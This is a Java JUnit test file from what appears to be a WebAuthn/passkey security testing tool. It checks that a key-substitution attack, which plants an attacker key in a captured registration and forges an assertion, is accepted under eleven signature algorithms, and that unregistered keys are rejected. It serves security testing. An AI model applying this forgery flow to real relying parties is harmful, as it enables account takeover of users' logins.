package com.anvil.passkeyeditor.attacks;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertNotNull;
import static org.junit.jupiter.api.Assertions.assertTrue;

import com.anvil.passkeyeditor.Fixtures;
import com.anvil.passkeyeditor.codec.CborCodec;
import com.anvil.passkeyeditor.codec.WrapperCodec;
import com.anvil.passkeyeditor.codec.Webauthn4jCborCodec;
import com.anvil.passkeyeditor.crypto.CoseSigner;
import com.anvil.passkeyeditor.crypto.EcdsaSigner;
import com.anvil.passkeyeditor.crypto.EdDsaSigner;
import com.anvil.passkeyeditor.crypto.Es256Signer;
import com.anvil.passkeyeditor.crypto.PsSigner;
import com.anvil.passkeyeditor.crypto.RsaSigner;
import com.anvil.passkeyeditor.model.AttestationObject;
import com.anvil.passkeyeditor.model.CoseKey;

import com.webauthn4j.data.attestation.authenticator.COSEKey;

import java.io.IOException;
import java.io.InputStream;
import java.nio.charset.StandardCharsets;
import java.security.GeneralSecurityException;
import java.security.PublicKey;
import java.security.Signature;
import java.security.spec.MGF1ParameterSpec;
import java.security.spec.PSSParameterSpec;
import java.util.List;
import java.util.function.Supplier;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.util.stream.Stream;

import org.junit.jupiter.api.DynamicTest;
import org.junit.jupiter.api.TestFactory;

/**
 * parity gate - the algorithm-confusion forgery oracle. It is {@link
 * ForgeryOracleTest} generalised across all eleven algorithms the tool now supports (ES256/384/512,
 * RS256/384/512/RS1, EdDSA, PS256/384/512): substitute an attacker key of that algorithm into the real captured
 * registration, forge an assertion over the real captured authentication with that key, and
 * prove the signature verifies against the key the secure RP would have stored - using the public key
 * webauthn4j recovers from the substituted credential.
 *
 * What this proves. The register-with-our-key key-substitution flow is algorithm-agnostic: because
 * {@link RegistrationSubstituter} and {@link AssertionForger} are written against the {@link CoseSigner}
 * seam and the codec embeds {@code publicCoseKey().raw()} verbatim, every signer composes into the
 * existing forgery pipeline with zero changes to the attack or codec layer. An RP that advertises
 * (or accepts a substituted key under) any of these algorithms stores our key and accepts our forgery -
 * full account takeover under that algorithm (Chen test #9, "insecure public-key algorithm").
 *
 * Capability boundary (a deliberate and noteworthy nuance). This proves we can plant and forge
 * under any supported algorithm. It does not - and cannot - let us re-sign a victim's
 * existing passkey of any algorithm: that needs the victim's private key. EdDSA matters precisely
 * because real RPs (webauthn.io, passkeys-debugger, webauthn.lubu) default to it, so the key-substitution flow there
 * must plant an EdDSA credential rather than re-sign the existing one.
 */
class AlgConfusionOracleTest {

    private final WrapperCodec wrapper = new WrapperCodec.Default();
    private final CborCodec cbor = new Webauthn4jCborCodec();

    /** COSE key-type label values (RFC 9053 / 8812). */
    private static final int KTY_EC2 = 2;
    private static final int KTY_OKP = 1;
    private static final int KTY_RSA = 3;

    /** One supported algorithm: how to mint its signer, its COSE key type, and an independent verifier. */
    private record Alg(String name, int kty, Supplier<CoseSigner> signer, Supplier<Signature> verifier) {
        @Override
        public String toString() {
            return name;
        }
    }

    private static List<Alg> algorithms() {
        return List.of(
                new Alg("ES256", KTY_EC2, Es256Signer::generate, () -> named("SHA256withECDSA")),
                new Alg("ES384", KTY_EC2, EcdsaSigner::es384, () -> named("SHA384withECDSA")),
                new Alg("ES512", KTY_EC2, EcdsaSigner::es512, () -> named("SHA512withECDSA")),
                new Alg("RS256", KTY_RSA, RsaSigner::rs256, () -> named("SHA256withRSA")),
                new Alg("RS384", KTY_RSA, RsaSigner::rs384, () -> named("SHA384withRSA")),
                new Alg("RS512", KTY_RSA, RsaSigner::rs512, () -> named("SHA512withRSA")),
                new Alg("RS1", KTY_RSA, RsaSigner::rs1, () -> named("SHA1withRSA")),
                new Alg("EdDSA", KTY_OKP, EdDsaSigner::generate, () -> named("Ed25519")),
                new Alg("PS256", KTY_RSA, PsSigner::ps256, () -> pss("SHA-256", MGF1ParameterSpec.SHA256, 32)),
                new Alg("PS384", KTY_RSA, PsSigner::ps384, () -> pss("SHA-384", MGF1ParameterSpec.SHA384, 48)),
                new Alg("PS512", KTY_RSA, PsSigner::ps512, () -> pss("SHA-512", MGF1ParameterSpec.SHA512, 64)));
    }

    /** A JCA verifier by standard name (ECDSA / RSA PKCS#1 / EdDSA). */
    private static Signature named(String jcaName) {
        try {
            return Signature.getInstance(jcaName);
        } catch (GeneralSecurityException e) {
            throw new IllegalStateException(jcaName + " unavailable", e);
        }
    }

    /**
     * A JDK RSASSA-PSS verifier with the COSE-mandated parameters. webauthn4j 0.28.3 reports a PS label as
     * Unknown and cannot select a verifier itself, so the oracle supplies one (the public key is still
     * recovered through webauthn4j - see {@code PsSignerTest}).
     */
    private static Signature pss(String hash, MGF1ParameterSpec mgf1, int saltLength) {
        try {
            Signature s = Signature.getInstance("RSASSA-PSS");
            s.setParameter(new PSSParameterSpec(hash, "MGF1", mgf1, saltLength, 1));
            return s;
        } catch (GeneralSecurityException e) {
            throw new IllegalStateException("RSASSA-PSS unavailable", e);
        }
    }

    // ---- real-fixture plumbing (same discipline as ForgeryOracleTest) --------------------------

    private static String loadFixture(String name) {
        try (InputStream in = AlgConfusionOracleTest.class.getResourceAsStream("/fixtures/" + name)) {
            if (in == null) {
                throw new IllegalStateException("missing test fixture: /fixtures/" + name);
            }
            return new String(in.readAllBytes(), StandardCharsets.UTF_8);
        } catch (IOException e) {
            throw new IllegalStateException(e);
        }
    }

    private static byte[] field(String body, String name) {
        Matcher m = Pattern.compile("\"" + name + "\":\"([^\"]+)\"").matcher(body);
        if (!m.find()) {
            throw new IllegalStateException("field not found: " + name);
        }
        return m.group(1).getBytes(StandardCharsets.US_ASCII);
    }

    private byte[] realRegistrationAttestationCbor() {
        return wrapper.unwrap(field(loadFixture("reg-clean.json"), "attestationObject")).inner();
    }

    private byte[] realAssertionAuthData() {
        return wrapper.unwrap(field(loadFixture("auth-clean.json"), "authenticatorData")).inner();
    }

    private byte[] realAssertionClientData() {
        return wrapper.unwrap(field(loadFixture("auth-clean.json"), "clientDataJSON")).inner();
    }

    /** The JCA public key a relying party recovers from a stored COSE credential key (via webauthn4j). */
    private PublicKey rpStoredPublicKey(CoseKey credentialKey) {
        COSEKey w4j = Fixtures.decodeCoseKey(cbor.encodeCoseKey(credentialKey));
        return w4j.getPublicKey();
    }

    // ---- the parametric signer ---------------------------------------------------------------

    private void assertSecureRpAcceptsForgery(CoseSigner attacker, int expectedKty, Signature verifier)
            throws Exception {
        AttestationObject reg = cbor.decodeAttestationObject(realRegistrationAttestationCbor());
        byte[] substitutedReg = new RegistrationSubstituter(cbor).substituteAndEncode(reg, attacker);

        CoseKey storedKey = cbor.decodeAttestationObject(substitutedReg).authData().credentialPublicKey();
        assertNotNull(storedKey, "substituted registration carries a credential key");
        // Proves the fixture's original EC2/ES256 key was actually replaced by the attacker algorithm's key.
        assertEquals(expectedKty, storedKey.kty(), "substituted credential key is the attacker alg's key type");
        PublicKey rpStored = rpStoredPublicKey(storedKey);

        byte[] authData = realAssertionAuthData();
        byte[] clientData = realAssertionClientData();
        byte[] forgedSig = new AssertionForger().sign(authData, clientData, attacker);

        verifier.initVerify(rpStored);
        verifier.update(AssertionForger.signedInput(authData, clientData));
        assertTrue(verifier.verify(forgedSig),
                "a secure RP holding our substituted key accepts our forged assertion (full ATO under this alg)");
    }

    private void assertUnrelatedKeyRejected(CoseSigner registered, CoseSigner attacker, Signature verifier)
            throws Exception {
        AttestationObject reg = cbor.decodeAttestationObject(realRegistrationAttestationCbor());
        byte[] substitutedReg = new RegistrationSubstituter(cbor).substituteAndEncode(reg, registered);
        PublicKey rpStored = rpStoredPublicKey(
                cbor.decodeAttestationObject(substitutedReg).authData().credentialPublicKey());

        byte[] authData = realAssertionAuthData();
        byte[] clientData = realAssertionClientData();
        byte[] forgedSig = new AssertionForger().sign(authData, clientData, attacker);

        verifier.initVerify(rpStored);
        verifier.update(AssertionForger.signedInput(authData, clientData));
        assertFalse(verifier.verify(forgedSig), "a forgery by an unregistered key must be rejected");
    }

    @TestFactory
    Stream<DynamicTest> everyAlgorithmKeySubstitutionForgeryVerifiesUnderTheStoredKey() {
        return algorithms().stream().map(a -> DynamicTest.dynamicTest(
                a.name() + ": secure RP storing our substituted key accepts our forged assertion",
                () -> assertSecureRpAcceptsForgery(a.signer().get(), a.kty(), a.verifier().get())));
    }

    @TestFactory
    Stream<DynamicTest> everyAlgorithmRejectsAnUnrelatedKey() {
        return algorithms().stream().map(a -> DynamicTest.dynamicTest(
                a.name() + ": a forgery by an unregistered key is rejected",
                () -> assertUnrelatedKeyRejected(a.signer().get(), a.signer().get(), a.verifier().get())));
    }
}
